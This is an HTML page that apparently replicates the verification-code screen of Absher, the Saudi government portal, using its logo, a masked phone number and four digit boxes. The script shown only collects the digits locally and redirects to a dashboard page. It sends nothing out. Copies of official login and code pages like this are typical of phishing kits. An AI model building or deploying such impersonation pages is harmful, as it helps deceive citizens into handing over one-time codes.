<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />
  <title>رمز التحقق - ابشر</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" />
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: "Cairo", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }

    body {
      min-height: 100vh;
      margin: 0;
      background-color: #ffffff;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #1b2b1f;
      overflow: hidden;
    }

    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: url(images/bg-Individuals2.svg) top left no-repeat, url(images/bg-Individuals.svg) bottom right no-repeat !important;      background-size: cover;
      opacity: 0.3;
      pointer-events: none;
      z-index: -1;
    }

    .verify-wrapper {
      width: 100%;
      max-width: 1100px;
      padding: 70px 32px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .verify-card {
      text-align: center;
      transform: scale(0.9);
    }

    .verify-logo {
      margin-bottom: 32px;
    }

    .verify-logo-main {
      display: inline-flex;
      flex-direction: column;
      align-items: center;
      gap: 16px;
    }

    .verify-logo-image {
      height: 120px;
    }

    .verify-title {
      font-size: 26px;
      font-weight: 800;
      margin-bottom: 12px;
    }

    .verify-subtitle {
      font-size: 16px;
      color: #666666;
      font-weight: 700;
      margin-bottom: 16px;
    }

    .verify-mobile-mask {
      font-size: 32px;
      font-weight: 800;
      letter-spacing: 2px;
      margin-top: 0;
      margin-bottom: 50px;
    }

    .verify-error {
      font-size: 13px;
      color: #d93025;
      font-weight: 600;
      margin-bottom: 32px;
    }

    .code-inputs {
      display: flex;
      justify-content: center;
      gap: 32px;
      margin: 60px 0 48px;
    }

    .code-box {
      width: 60px;
      height: 64px;
      border: none;
      border-bottom: 3px solid #00ab67;
      border-radius: 0;
      background: transparent;
      text-align: center;
      direction: ltr;
      font-size: 32px;
      font-weight: 800;
      padding-bottom: 4px;
    }

    .code-box:focus {
      outline: none;
      border-bottom-color: #00703c;
      box-shadow: none;
    }

    .verify-button {
      min-width: 200px;
      padding: 12px 32px;
      border-radius: 6px;
      border: 1px solid #00a86b;
      background-color: #ffffff;
      color: #00a86b;
      font-weight: 800;
      font-size: 16px;
      margin-top: 28px;
      cursor: pointer;
    }

    .verify-button:hover {
      background-color: #00a86b;
      color: #ffffff;
      border-color: #00a86b;
    }

    .loading-overlay {
      position: fixed;
      inset: 0;
      background: rgba(255, 255, 255, 0.9);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 2000;
    }

    .loading-content {
      text-align: center;
      color: #00663d;
      font-weight: 800;
    }

    .loading-bars {
      display: flex;
      align-items: flex-end;
      justify-content: center;
      gap: 6px;
      margin-bottom: 16px;
    }

    .loading-bar {
      width: 10px;
      height: 40px;
      border-radius: 999px;
      background: #00a86b;
      opacity: 0.2;
      animation: loadingPulse 0.8s infinite ease-in-out;
    }

    .loading-bar:nth-child(1) { animation-delay: 0s; }
    .loading-bar:nth-child(2) { animation-delay: 0.1s; }
    .loading-bar:nth-child(3) { animation-delay: 0.2s; }
    .loading-bar:nth-child(4) { animation-delay: 0.3s; }

    @keyframes loadingPulse {
      0%, 100% {
        transform: scaleY(0.4);
        opacity: 0.3;
      }
      50% {
        transform: scaleY(1);
        opacity: 1;
      }
    }

    #labibaWebBotDiv {
      position: fixed;
      bottom: 24px;
      right: 24px;
      width: 64px;
      height: 64px;
      border-radius: 50%;
      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.25);
      cursor: pointer;
      z-index: 1000;
    }

    #signLanguageIcon {
      position: fixed;
      bottom: 100px;
      right: 24px;
      width: 64px;
      height: 64px;
      border-radius: 50%;
      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.25);
      cursor: pointer;
      z-index: 1000;
    }

    @media (max-width: 600px) {
      .code-inputs {
        gap: 20px;
        margin: 40px 0 36px;
      }

      .code-box {
        width: 46px;
        height: 48px;
        font-size: 24px;
      }
    }
  </style>
</head>

<body>
  <div class="verify-wrapper">
    <div class="verify-card">
      <div class="verify-logo">
        <div class="verify-logo-main">
          <img src="images/moi-absher.svg" alt="أبشر" class="verify-logo-image" />
        </div>
      </div>

      <div class="verify-title">رمز التحقق</div>
      <div class="verify-subtitle">
        الرجاء إدخال رقم التأكيد الذي تم إرساله على الجوال
      </div>
      <div class="verify-mobile-mask">*****7267</div>
      <div class="code-inputs">
        <input type="text" maxlength="1" class="code-box" />
        <input type="text" maxlength="1" class="code-box" />
        <input type="text" maxlength="1" class="code-box" />
        <input type="text" maxlength="1" class="code-box" />
      </div>

      <button class="verify-button" type="button">إلغاء</button>
    </div>
  </div>
  <div class="loading-overlay" id="loadingOverlay">
    <div class="loading-content">
      <div class="loading-bars">
        <div class="loading-bar"></div>
        <div class="loading-bar"></div>
        <div class="loading-bar"></div>
        <div class="loading-bar"></div>
      </div>
    </div>
  </div>
  <img
    id="signLanguageIcon"
    src="images/signDeaf.png"
    alt="sign language support"
  />
  <img
    id="labibaWebBotDiv"
    src="https://cdn.labiba.ai/UploadedFiles/WebIntegration/Images/Absher/user.png"
    alt="user"
  />
  <script>
    const codeInputs = document.querySelectorAll(".code-box");
    const loadingOverlay = document.getElementById("loadingOverlay");
    const redirectUrl = "dashboard.html";

    function allInputsFilled() {
      return Array.from(codeInputs).every((inp) => inp.value && inp.value.trim() !== "");
    }

    function showLoadingAndRedirect() {
      if (!loadingOverlay) return;
      loadingOverlay.style.display = "flex";
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 3000);
    }

    codeInputs.forEach((input, index) => {
      input.addEventListener("input", () => {
        input.value = input.value.replace(/[^0-9]/g, "");
        if (input.value && index < codeInputs.length - 1) {
          codeInputs[index + 1].focus();
        }

        if (allInputsFilled()) {
          showLoadingAndRedirect();
        }
      });

      input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
          codeInputs[index - 1].focus();
        }
      });
    });

    if (codeInputs[0]) {
      codeInputs[0].focus();
    }
  </script>
</body>

</html>
